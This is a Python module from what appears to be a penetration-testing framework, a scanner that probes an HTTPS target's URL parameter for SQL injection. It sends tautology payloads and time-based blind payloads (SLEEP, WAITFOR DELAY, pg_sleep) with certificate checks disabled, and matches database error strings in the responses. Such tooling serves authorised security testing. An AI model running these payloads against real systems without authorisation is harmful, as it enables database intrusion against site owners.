# scripts/https/attack/sqli_detect.py
import ssl, urllib.request, urllib.error, urllib.parse, time, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax", r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"microsoft ole db provider for sql server",
    r"postgresql.*error", r"warning.*pg_query",
    r"ora-\d{4,}", r"sqlite.*exception", r"warning.*mssql",
]
SQLI_PAYLOADS = ["'","''","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1","1 AND 1=2","1'",";--"]
TIME_PAYLOADS = [
    ("MySQL",      "' AND SLEEP(3)--"),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:3'--"),
    ("PostgreSQL", "'; SELECT pg_sleep(3)--"),
]

class Script(BaseScript):
    name        = "sqli-detect"
    protocol    = "https"
    category    = "attack"
    description = "Detección de SQL injection sobre HTTPS: error-based y time-based blind."

    EXAMPLES = [
        {"flag": "--path / --param", "desc": "Ruta y parámetro",
         "good": "https --script=sqli-detect -t 10.10.10.5 --path /search --param q",
         "bad":  "https --script=sqli-detect (usa defaults)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param") or "id"
        ip      = self.target.ip
        base    = f"https://{ip}:{port}"

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener   = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        findings = []

        for payload in SQLI_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                try:
                    resp = opener.open(req, timeout=timeout)
                    body = resp.read(65536).decode("utf-8", errors="replace").lower()
                except urllib.error.HTTPError as e:
                    body = e.read(65536).decode("utf-8", errors="replace").lower() if e else ""
                for pattern in SQLI_ERROR_PATTERNS:
                    if re.search(pattern, body, re.I):
                        findings.append(("Error-based", payload, pattern))
                        session_db.save_finding(ip, "HTTPS", "sqli_error_based",
                                                f"param={param} payload={payload}")
                        break
            except Exception:
                pass

        for db_name, payload in TIME_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote('1' + payload)}"
            try:
                t0 = time.time()
                try: opener.open(url, timeout=10)
                except Exception: pass
                elapsed = time.time() - t0
                if elapsed >= 2.5:
                    findings.append(("Time-based", f"1{payload}", f"{elapsed:.1f}s ({db_name})"))
                    session_db.save_finding(ip, "HTTPS", "sqli_time_based",
                                            f"param={param} db={db_name} delay={elapsed:.1f}s")
            except Exception:
                pass

        if findings:
            print_table(f"SQLi HTTPS — {ip}:{port}", ["Tipo","Payload","Evidencia"], findings)
            print_result("HTTPS", ip, "pwned", f"SQL INJECTION en '{param}'")
        else:
            print_check(f"Sin SQLi en '{param}'", ok=True)

        return findings
